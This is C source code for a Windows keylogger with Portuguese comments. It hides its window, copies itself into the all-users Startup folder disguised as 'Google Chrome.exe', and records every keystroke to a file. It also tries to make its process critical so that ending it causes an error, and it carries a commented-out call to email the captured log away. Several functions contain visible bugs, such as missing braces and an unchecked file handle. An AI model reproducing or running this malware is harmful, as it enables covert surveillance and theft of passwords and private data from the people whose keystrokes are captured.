#if defined (unix)
	#error O sistema operacional deve ser Windows
#endif

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <locale.h>
#include <time.h>
#include <string.h>
#include "include/sendmail.h"

void KeyLogger();
void MoveProgram();
void ConvertToChar(int, FILE *);
BOOL ProtectProcess();
BOOL EnablePriv (const char *);

int main()
{
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	MoveProgram();
	ProtectProcess();
	
	while(TRUE){
		KeyLogger();
		Sleep(1);
	}
	return (EXIT_SUCCESS);
}

void KeyLogger()
{	
	FILE *file = NULL;
	file = fopen(FILENAME, "a+");

	for(int keyCode=1; keyCode <= 222; keyCode++) {
		int keyState = GetAsyncKeyState(keyCode);
		
		if(keyState == -32767){
			ConvertToChar(keyCode, file);
		}
	}
	fclose(file);

	file = fopen(FILENAME, "rb");
	fseek(file, 0, SEEK_END);
	int length = ftell(file);
	
	if (length >= FILELENGTH) {
		fseek(file, 0, SEEK_SET);
		char* buffer = (char * )malloc(length);
		size_t freadindex = fread(buffer, 1, length, file);
		buffer[freadindex] = '\0';
		
		// Enviando por email as informações contidas no file
		// sendEmail("email1@gmail.com", "email2@gmail.com", "Tanto faz, keylogger", buffer);
		
		// Apagando todos os dados do file
		file = fopen(FILENAME, "w");
	}
	fclose(file);
}

void MoveProgram()
{	
	FILE *fp;

	// Pegando o caminho deste programa
	char pathToFile[MAX_PATH];
	HMODULE getMod = GetModuleHandle (NULL);
	GetModuleFileName(getMod, pathToFile, sizeof(pathToFile));

	// Fazendo com que este programa seja executado sem que o usuario fizer logon
	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
	fp = fopen(destino, "r");

	if(!fp){
		CopyFile(pathToFile, destino, 0);
	}
	fclose(fp);
}

void ConvertToChar(int keyCode, FILE *file)
{
	if(keyCode >= 39 && keyCode <= 64){ // (' - @)
		fputc(keyCode, file);
	}else if ((keyCode > 64) && (keyCode < 91)){ // (a - z)
		keyCode += 32; 
		fputc(keyCode, file); 
	}else{
		switch (keyCode) {
			case VK_SPACE:   fputc(' ', file); 					  break;
			case VK_SHIFT:   fputs("\r\n[SHIFT]\r\n", file);      break;
			case VK_RETURN:  fputs("\r\n[ENTER]\r\n", file); 	  break;
			case VK_BACK:    fputs("\r\n[BACKSPACE]\r\n", file);  break;
			case VK_TAB:     fputs("\r\n[TAB]\r\n", file); 	      break;
			case VK_CONTROL: fputs("\r\n[CTRL]\r\n", file);		  break;
			case VK_DELETE:  fputs("\r\n[DEL]\r\n", file); 		  break;
			case VK_OEM_1:   fputs("\r\n[;:]\r\n", file); 		  break;
			case VK_OEM_2:   fputs("\r\n[/?]\r\n", file); 		  break;
			case VK_OEM_3:   fputs("\r\n[`~]\r\n", file); 		  break;
			case VK_OEM_4:   fputs("\r\n[ [{ ]\r\n", file); 	  break;
			case VK_OEM_5:   fputs("\r\n[\\|]\r\n", file); 		  break;
			case VK_OEM_6:   fputs("\r\n[ ]} ]\r\n", file); 	  break;
			case VK_OEM_7:   fputs("\r\n['\"]\r\n", file); 		  break;
			case VK_CAPITAL: fputs("\r\n[CAPS LOCK]\r\n", file);  break;
			case VK_F1:		 fputs("\r\n[F1]\r\n", file);		  break;
			case VK_F2:		 fputs("\r\n[F2]\r\n", file);		  break;
			case VK_F3:		 fputs("\r\n[F3]\r\n", file);		  break;
			case VK_F4:		 fputs("\r\n[F4]\r\n", file);		  break;
			case VK_F5:		 fputs("\r\n[F5]\r\n", file);		  break;
			case VK_F6:		 fputs("\r\n[F6]\r\n", file);		  break;
			case VK_F7:		 fputs("\r\n[F7]\r\n", file);		  break;
			case VK_F8:		 fputs("\r\n[F8]\r\n", file);		  break;
			case VK_F9:		 fputs("\r\n[F9]\r\n", file);		  break;
			case VK_F10:	 fputs("\r\n[F10]\r\n", file);		  break;
			case VK_F11:	 fputs("\r\n[F11]\r\n", file);		  break;
			case VK_F12:	 fputs("\r\n[F12]\r\n", file);		  break;
			case VK_NUMPAD0: fputc('0', file); 					  break;
			case VK_NUMPAD1: fputc('1', file); 					  break;
			case VK_NUMPAD2: fputc('2', file); 					  break;
			case VK_NUMPAD3: fputc('3', file); 					  break;
			case VK_NUMPAD4: fputc('4', file); 					  break;
			case VK_NUMPAD5: fputc('5', file); 					  break;
			case VK_NUMPAD6: fputc('6', file); 					  break;
			case VK_NUMPAD7: fputc('7', file); 					  break;
			case VK_NUMPAD8: fputc('8', file); 					  break;
			case VK_NUMPAD9: fputc('9', file); 					  break;
			case 187: 	     fputc('+', file);					  break;
			case 188: 	     fputc(',', file);					  break;
			case 189: 	     fputc('-', file);					  break;
			case 190: 	     fputc('.', file);					  break;
		}
	}
}
 
 // Função para impedir que o processo deste programa seja finalizado
 // Se o usuario tentar finaliza-lo, recebera um erro
BOOL ProtectProcess() 
{
	typedef long (WINAPI *RtlSetProcessIsCritical) (
        IN BOOLEAN	bNew, 
        OUT BOOLEAN *pbOld, 
        IN BOOLEAN  bNeedScb);

	if (EnablePriv(SE_DEBUG_NAME) != TRUE)
		printf("Erro nas permissoes.\n"); return FALSE;
    
    HANDLE DLL = LoadLibrary("ntdll.dll");
    if(DLL == NULL)
		printf("Erro na DLL.\n"); return FALSE;

	RtlSetProcessIsCritical setCritical;
	setCritical = (RtlSetProcessIsCritical) GetProcAddress((HINSTANCE) DLL, "RtlSetProcessIsCritical");
	
	if (!setCritical)
		return FALSE;
	setCritical(TRUE, NULL, FALSE);

	// SetCriticalProcess(FALSE, NULL, FALSE);
	return TRUE;
}
 
BOOL EnablePriv (const char *szPriv)
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES privs;
    memset (&privs, 0, sizeof (privs));

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
        return FALSE;

    if (!LookupPrivilegeValue(NULL, szPriv, &luid))
        CloseHandle (hToken); return FALSE;
    

    privs.PrivilegeCount = 1;
    privs.Privileges[0].Luid = luid;
    privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges (hToken, FALSE, &privs, sizeof(privs), NULL, NULL);
    CloseHandle (hToken);
    return bRet;
}

//MesageBox(	NULL, "Could not obtain function from ntdll!", "Error", MB_ICONEXCLAMATION | MB_OK);